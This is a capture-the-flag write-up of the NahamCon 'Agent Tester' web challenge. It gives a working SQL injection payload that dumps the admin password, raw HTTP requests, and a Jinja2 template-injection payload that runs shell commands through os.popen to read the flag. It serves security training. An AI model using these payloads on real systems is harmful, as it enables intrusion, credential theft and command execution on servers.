# Agent Tester

Tags:

## Challenge
>Author: @jorgectf#3896
>
>We've recently hired an entry-level web developer to build an internal system to test User Agents, let us know if you find any errors!
>
>Download the files below and press the Start button on the top-right to begin this challenge.
>
>Attachments:  agenttester.zip



## Solving

### Create new “test” account, logged in and perform SQLi to retreive admin credential
```
' union select username,password from user where username="admin" --
```




Admin credential:

```
admin:*)(@skdnaj238374834**__**=
```

### Source code analysis 

run.sh:


app.py
```
/debug only available when connected as admin
```


### Test /debug

simple query:
```
POST /debug HTTP/1.1
Host: challenge.nahamcon.com:31507
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://challenge.nahamcon.com:31507
Connection: keep-alive, Upgrade
Cookie: auth=eyJpZCI6MX0.YFI5uA.0ELzFT74EL6t2jVIdU_7u-9cdkM
Content-Length: 9
Content-Type: application/x-www-form-urlencoded
```
response:
```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Wed, 17 Mar 2021 17:18:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 19
Connection: keep-alive
Vary: Cookie

<h1>Safe Debug</h1>
```

query with code variable:
```
POST /debug HTTP/1.1
Host: challenge.nahamcon.com:31507
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://challenge.nahamcon.com:31507
Connection: keep-alive, Upgrade
Cookie: auth=eyJpZCI6MX0.YFI5uA.0ELzFT74EL6t2jVIdU_7u-9cdkM
Content-Length: 9
Content-Type: application/x-www-form-urlencoded

code=flag
```

response:
```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Wed, 17 Mar 2021 17:26:32 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 4
Connection: keep-alive
Vary: Cookie

flag
```

### Exploit /debug with SSTI (Server Side Template Injection)

query:
```
POST /debug HTTP/1.1
Host: challenge.nahamcon.com:31507
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://challenge.nahamcon.com:31507
Connection: keep-alive, Upgrade
Cookie: auth=eyJpZCI6MX0.YFI5uA.0ELzFT74EL6t2jVIdU_7u-9cdkM
Content-Length: 109
Content-Type: application/x-www-form-urlencoded

code={{request.application.__globals__.__builtins__.__import__('os').popen('echo $CHALLENGE_FLAG').read()}}
```

resonse:
```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Wed, 17 Mar 2021 17:31:32 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: Cookie
Content-Length: 39

flag{fb4a87cfa85cf8c5ab2effedb4ea7006}
```

### Informations
https://hackmd.io/@Chivato/HyWsJ31dI

`flag{fb4a87cfa85cf8c5ab2effedb4ea7006}`
